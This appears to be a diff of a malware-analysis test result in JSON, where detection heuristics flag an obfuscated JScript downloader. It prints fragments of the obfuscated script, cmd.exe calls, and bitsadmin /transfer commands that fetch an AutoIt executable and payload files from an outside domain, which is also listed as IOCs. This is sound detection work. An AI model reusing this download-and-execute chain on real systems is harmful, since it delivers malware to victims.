@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 130,
+    "score": 652,
     "sections": [
       {
         "auto_collapse": true,
@@ -104,7 +104,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\tvar hYlWXjdjaPpgNpHbQTA = new ActiveXObject(\\\"WScript.Shell\\\")\n\t\tvar RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\"Scripting.FileSystemObject\")\n\t\tvar hYlWXjdjaPpgNpHbQTA = new ActiveXObject(\"WScript.Shell\")\n\t\tvar RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\"Scripting.FileSystemObject\")",
+        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(Scripting.FileSystemObject)\n\t\tActiveXObject(WScript.Shell)\n\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\tvar hYlWXjdjaPpgNpHbQTA = new ActiveXObject(\\\"WScript.Shell\\\")\n\t\tvar RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\"Scripting.FileSystemObject\")\n\t\tvar hYlWXjdjaPpgNpHbQTA = new ActiveXObject(\"WScript.Shell\")\n\t\tvar RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\"Scripting.FileSystemObject\")",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -128,7 +128,31 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\tvar RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\"Scripting.FileSystemObject\")\n\t\tvar RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\"Scripting.FileSystemObject\")",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[15]()",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "creates_wsh_object": 10
+          },
+          "signatures": {
+            "creates_wsh_object": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: CreatesWshObject",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tActiveXObject(Scripting.FileSystemObject)\n\t\tWScript.CreateObject(\"Scripting.FileSystemObject\")\n\t\tnew Scripting.FileSystemObject[14]()\n\t\tScripting.FileSystemObject[14].FileExists(\"C:\\Users\\Public\\po\")\n\t\tnew Scripting.FileSystemObject[16]()\n\t\tScripting.FileSystemObject[16].CreateFolder(\"C:\\W63770416524\\\")\n\t\tScripting.FileSystemObject[14].FileExists(\"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.exe\")\n\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\tvar RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\"Scripting.FileSystemObject\")\n\t\tvar RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\"Scripting.FileSystemObject\")",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -152,7 +176,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\thYlWXjdjaPpgNpHbQTA.run('cmd /V /C \\\"echo '+wwhZyIIaxBpcxahb+'>'+IQKOrqKcLieoUcoiAOeHV+qkrEJUKOIcLcr...\n\t\t} catch (QBkhZXClpWYWxilyQkXzUE) { } \t\t\t\t\t\t\t\t\t\ttry {\t\t\t\t hYlWXjdjaPpgNpHbQTA.run('cmd /V /C \\\"echo N...\n\t\t} catch (GAcjWCRAUHrRzUrAxKTrny) {\t\t\t\t\t\t}\t\t\t\t\ttry {\t\t\t\t hYlWXjdjaPpgNpHbQTA.run('cmd /V /C \\\"echo No...\n\t\thYlWXjdjaPpgNpHbQTA.run('cmd /V /C \"echo '+wwhZyIIaxBpcxahb+'>'+IQKOrqKcLieoUcoiAOeHV+qkrEJUKOIcLcry...\n\t\thYlWXjdjaPpgNpHbQTA.run('cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>'+wwhZyIIaxBpcxahb+'\\\\r1....\n\t\thYlWXjdjaPpgNpHbQTA.run('cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>'+wwhZyIIaxBpcxahb+'\\\\r.l...",
+        "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo C:\\W63770416524\\>C:\\Users\\Public\\po\"&& exit\", 0, true)\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r1.log\"&& ...\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r.log\"&& e...\n\t\thYlWXjdjaPpgNpHbQTA.run('cmd /V /C \\\"echo '+wwhZyIIaxBpcxahb+'>'+IQKOrqKcLieoUcoiAOeHV+qkrEJUKOIcLcr...\n\t\t} catch (QBkhZXClpWYWxilyQkXzUE) { } \t\t\t\t\t\t\t\t\t\ttry {\t\t\t\t hYlWXjdjaPpgNpHbQTA.run('cmd /V /C \\\"echo N...\n\t\t} catch (GAcjWCRAUHrRzUrAxKTrny) {\t\t\t\t\t\t}\t\t\t\t\ttry {\t\t\t\t hYlWXjdjaPpgNpHbQTA.run('cmd /V /C \\\"echo No...\n\t\thYlWXjdjaPpgNpHbQTA.run('cmd /V /C \"echo '+wwhZyIIaxBpcxahb+'>'+IQKOrqKcLieoUcoiAOeHV+qkrEJUKOIcLcry...\n\t\thYlWXjdjaPpgNpHbQTA.run('cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>'+wwhZyIIaxBpcxahb+'\\\\r1....\n\t\thYlWXjdjaPpgNpHbQTA.run('cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>'+wwhZyIIaxBpcxahb+'\\\\r.l...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -172,6 +196,54 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: RunsCommandPrompt",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs dropped executable\n\t\tWScript.Shell[15].run(\"colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe\", 0, true)\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset\", 0, true)\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 500,
+          "score_map": {
+            "runs_executable": 500
+          },
+          "signatures": {
+            "runs_executable": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsExecutable",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo C:\\W63770416524\\>C:\\Users\\Public\\po\"&& exit\", 0, true)\n\t\tWScript.Shell[15].run(\"colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe\", 0, true)\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset\", 0, true)\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r1.log\"&& ...\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r.log\"&& e...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "runs_shell": 10
+          },
+          "signatures": {
+            "runs_shell": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: RunsShell",
         "zeroize_on_tag_safe": false
       },
       {
@@ -197,11 +269,258 @@
         "tags": {},
         "title_text": "Signature: SuspiciousUseOfCharCodes",
         "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "lwaiyh.cloudthradchen.fun",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?37437974563613970",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?39711079126693642",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?48710006293678025",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?48963051144664142",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?50209571596639078",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?55863631366632969",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?57261752224628739",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/?37437974563613970",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?39711079126693642",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?48710006293678025",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?48963051144664142",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?50209571596639078",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?55863631366632969",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?57261752224628739",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "domain": [
+                "lwaiyh.cloudthradchen.fun"
+              ],
+              "uri": [
+                "http://lwaiyh.cloudthradchen.fun/?37437974563613970",
+                "http://lwaiyh.cloudthradchen.fun/?39711079126693642",
+                "http://lwaiyh.cloudthradchen.fun/?48710006293678025",
+                "http://lwaiyh.cloudthradchen.fun/?48963051144664142",
+                "http://lwaiyh.cloudthradchen.fun/?50209571596639078",
+                "http://lwaiyh.cloudthradchen.fun/?55863631366632969",
+                "http://lwaiyh.cloudthradchen.fun/?57261752224628739"
+              ],
+              "uri_path": [
+                "/?37437974563613970",
+                "/?39711079126693642",
+                "/?48710006293678025",
+                "/?48963051144664142",
+                "/?50209571596639078",
+                "/?55863631366632969",
+                "/?57261752224628739"
+              ]
+            }
+          }
+        },
+        "title_text": "MalwareJail extracted the following IOCs",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "ioc": "lwaiyh.cloudthradchen.fun",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?37437974563613970",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?39711079126693642",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?48710006293678025",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?48963051144664142",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?50209571596639078",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?55863631366632969",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://lwaiyh.cloudthradchen.fun/?57261752224628739",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/?37437974563613970",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?39711079126693642",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?48710006293678025",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?48963051144664142",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?50209571596639078",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?55863631366632969",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/?57261752224628739",
+            "ioc_type": "uri_path"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 13,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "cmd /V /C \"echo C:\\W63770416524\\>C:\\Users\\Public\\po\"&& exit",
+                "colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe",
+                "C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?57261752224628739 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.exe\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?55863631366632969 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.log\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?50209571596639078 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3dbl.log\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?48963051144664142 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3dbu.log\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?48710006293678025 \"C:\\W63770416524\\sqlite3.dll\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?39711079126693642 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3db.temp\"",
+                "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?37437974563613970 \"C:\\W63770416524\\boss.log\"",
+                "cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r1.log\"&& exit",
+                "cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r.log\"&& exit"
+              ]
+            }
+          },
+          "network": {
+            "dynamic": {
+              "domain": [
+                "lwaiyh.cloudthradchen.fun"
+              ],
+              "uri": [
+                "http://lwaiyh.cloudthradchen.fun/?37437974563613970",
+                "http://lwaiyh.cloudthradchen.fun/?39711079126693642",
+                "http://lwaiyh.cloudthradchen.fun/?48710006293678025",
+                "http://lwaiyh.cloudthradchen.fun/?48963051144664142",
+                "http://lwaiyh.cloudthradchen.fun/?50209571596639078",
+                "http://lwaiyh.cloudthradchen.fun/?55863631366632969",
+                "http://lwaiyh.cloudthradchen.fun/?57261752224628739"
+              ],
+              "uri_path": [
+                "/?37437974563613970",
+                "/?39711079126693642",
+                "/?48710006293678025",
+                "/?48963051144664142",
+                "/?50209571596639078",
+                "/?55863631366632969",
+                "/?57261752224628739"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs extracted from WScript",
+        "zeroize_on_tag_safe": false
       }
     ]
   },
   "files": {
-    "extracted": [],
+    "extracted": [
+      {
+        "name": "extracted_wscript.bat",
+        "sha256": "6cfd4e7f906b980fac443e072391c16caa5efd4a6640bcbf6a192fa756d03daf"
+      }
+    ],
     "supplementary": [
       {
         "name": "temp_javascript.js",
@@ -213,9 +532,21 @@
     "heuristics": [
       {
         "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
         "heur_id": 3,
         "signatures": [
           "active_x_object"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "creates_wsh_object"
         ]
       },
       {
@@ -236,11 +567,255 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
+          "runs_executable"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "runs_shell"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
           "suspicious_char_codes"
         ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 13,
+        "signatures": []
       }
     ],
-    "tags": {},
+    "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?37437974563613970 \"C:\\W63770416524\\boss.log\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?39711079126693642 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3db.temp\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?48710006293678025 \"C:\\W63770416524\\sqlite3.dll\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?48963051144664142 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3dbu.log\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?50209571596639078 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3dbl.log\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?55863631366632969 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.log\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223649 /priority foreground http://lwaiyh.cloudthradchen.fun/?57261752224628739 \"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.exe\""
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "cmd /V /C \"echo C:\\W63770416524\\>C:\\Users\\Public\\po\"&& exit"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r.log\"&& exit"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r1.log\"&& exit"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe"
+        }
+      ],
+      "network.dynamic.domain": [
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "lwaiyh.cloudthradchen.fun"
+        }
+      ],
+      "network.dynamic.uri": [
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?37437974563613970"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?39711079126693642"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?48710006293678025"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?48963051144664142"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?50209571596639078"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?55863631366632969"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?57261752224628739"
+        }
+      ],
+      "network.dynamic.uri_path": [
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "/?37437974563613970"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "/?39711079126693642"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "/?48710006293678025"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "/?48963051144664142"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "/?50209571596639078"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "/?55863631366632969"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [],
+          "value": "/?57261752224628739"
+        }
+      ],
+      "network.static.domain": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "lwaiyh.cloudthradchen.fun"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?37437974563613970"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?39711079126693642"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?48710006293678025"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?48963051144664142"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?50209571596639078"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?55863631366632969"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://lwaiyh.cloudthradchen.fun/?57261752224628739"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/?37437974563613970"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/?39711079126693642"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/?48710006293678025"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/?48963051144664142"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/?50209571596639078"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/?55863631366632969"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/?57261752224628739"
+        }
+      ]
+    },
     "temp_submission_data": {}
   }
 }
